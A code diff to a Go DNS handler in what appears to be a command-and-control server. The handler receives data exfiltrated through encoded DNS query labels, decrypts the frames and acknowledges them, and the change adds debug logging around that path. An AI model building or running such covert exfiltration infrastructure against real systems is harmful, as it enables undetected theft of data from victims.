@@ -257,25 +257,38 @@ func handleQuery(packet []byte, cfg Config, clientIP string) ([]byte, error) {
 	// Detect dedicated exfil client traffic first (label framing or legacy EDNS metadata)
 	if q.Type == 1 {
 		domainHints := buildExfilDomainHints(cfg.Domain, c2Manager.GetKnownDomains())
+		if debugMode {
+			logf("[Exfil] Checking query: %s against domain hints: %v", q.Name, domainHints)
+		}
 		if frame, matched, frameErr := parseLabelEncodedExfilFrame(q.Name, domainHints, c2Manager.GetEncryptionKey()); matched {
 			ack := false
 			if frameErr == nil {
 				ack, err = c2Manager.ProcessExfilFrame(frame, clientIP)
 			} else {
 				err = frameErr
+				if debugMode {
+					logf("[Exfil] Frame parse error: %v (query: %s)", frameErr, q.Name)
+				}
 			}
 			if debugMode {
 				logExfilFrameDecision(frame, ack, err)
+			}
+			// Log ACK decision for debugging
+			willAck := err == nil && ack
+			if debugMode {
+				logf("[Exfil] ACK decision: willAck=%v, err=%v, ack=%v, svrAddr=%s", willAck, err, ack, cfg.SvrAddr)
 			}
 			answers := []DNSResourceRecord{{
 				Name:  q.Name,
 				Type:  1,
 				Class: 1,
 				TTL:   1,
-				RData: ackIPAddress(cfg.SvrAddr, err == nil && ack),
+				RData: ackIPAddress(cfg.SvrAddr, willAck),
 			}}
 			respMsg := buildResponse(msg, answers, 0)
 			return serializeMessage(respMsg), nil
+		} else if debugMode {
+			logf("[Exfil] Query not matched as exfil frame: %s", q.Name)
 		}
 
 		meta, metaErr := extractExfilMetadata(msg)
